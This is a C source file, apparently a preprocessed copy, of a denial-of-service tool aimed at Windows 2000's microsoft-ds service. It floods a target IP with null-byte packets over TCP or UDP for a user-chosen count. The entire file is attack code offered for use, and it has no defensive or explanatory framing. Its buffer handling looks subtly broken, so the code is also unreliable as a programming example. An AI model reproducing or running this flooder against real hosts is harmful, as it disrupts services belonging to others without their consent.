
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int target ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int nullbuffer ;


 int AF_INET ;
 int IPPROTO_TCP ;
 int IPPROTO_UDP ;
 unsigned short MICROSOFT_DS_PORT ;
 int PF_INET ;
 int SOCK_DGRAM ;
 int SOCK_STREAM ;
 int atoi (char*) ;
 int bzero (char*,int) ;
 int close (int) ;
 scalar_t__ connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int fprintf (int ,char*,...) ;
 int htons (unsigned short) ;
 scalar_t__ malloc (int) ;
 int memset (struct sockaddr_in*,int ,int) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int resolveTarget (char*) ;
 scalar_t__ send (int,char*,scalar_t__,int ) ;
 scalar_t__ sendto (int,char*,scalar_t__,int ,struct sockaddr*,int) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int stdout ;
 scalar_t__ strlen (char*) ;

int main(int argc, char *argv[])
{
        int sock;
 int count;
 struct sockaddr_in target;
 unsigned short port = MICROSOFT_DS_PORT;
 char *nullbuffer;


 printf("%c[41m", 0x1B);
 fprintf(stdout, "\n--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\n");
 printf("%c[0m", 0x1B);
 fprintf(stdout, "-----------------------------------------------------------\n");

        if(argc != 4)
        {
                fprintf(stderr, "--[ Invalid number of parameters!\n");
                fprintf(stderr, "--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\n", argv[0]);
                fprintf(stderr, "--[ Forex: %s 127.0.0.1 UDP 10000\n\n", argv[0]);
                exit(-1);
        }

 nullbuffer = (char *) malloc(10*1024*sizeof(char));
 bzero(nullbuffer,sizeof(nullbuffer));

 fprintf(stdout, "--[ Starting attack on %s...\n", argv[1]);

 memset(&target, 0, sizeof(target));
 target.sin_family = AF_INET;
 target.sin_addr.s_addr = resolveTarget(argv[1]);
 target.sin_port = htons(port);


 if(argv[2][0] == 'U')
 {
  if((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
  {
   perror("socket() failed ");
   exit(-1);
  }

  fprintf(stdout, "--[ Sending NULL byte string * %d via UDP\n", atoi(argv[3]));

  for(count=0;count<atoi(argv[3]);count++)
  {
      if(sendto(sock, nullbuffer, strlen(nullbuffer), 0, (struct sockaddr *) &target, sizeof(target)) != strlen(nullbuffer))
      {
    perror("sendto() failed ");
    exit(-1);
      } else { printf("."); }
  }
  close(sock);
  printf("\n");
 }
  else if(argv[2][0] == 'T')
 {

  fprintf(stdout, "--[ Connecting and sending NULL byte string * %d...\n", atoi(argv[3]));

  if((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
  {
   perror("socket() failed ");
   exit(-1);
  }

  if(connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0)
  {
   perror("connect() failed ");
   exit(-1);
  }

  for(count=0;count<atoi(argv[3]);count++)
  {
   if(send(sock, nullbuffer, strlen(nullbuffer), 0) != strlen(nullbuffer))
   {
    perror("send() failed ");
    exit(-1);
   } else { printf("."); }

  }
  close(sock);
  printf("\n");
 } else
 {
  fprintf(stderr, "--[ Error: You must define a protocol (TCP or UDP)\n\n");
  exit(-1);
 }

 fprintf(stdout, "--[ Finished flooding target!\n");
 fprintf(stdout, "--[ http://www.telhack.tk\n");

 return 0;
}
